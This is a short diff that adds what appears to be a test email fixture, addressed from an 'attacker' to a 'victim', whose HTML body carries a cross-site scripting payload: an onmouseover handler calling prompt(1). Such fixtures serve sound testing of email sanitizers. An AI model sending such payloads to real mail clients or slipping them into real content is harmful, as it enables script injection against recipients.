@@ -1,0 +1,7 @@
+From: <attacker@attacker.com>
+Subject: xsstest d
+To: victim@2980.com
+MIME-Version: 1.0
+Content-type: text/html
+
+<var onmouseover="prompt(1)">KFC</var>?
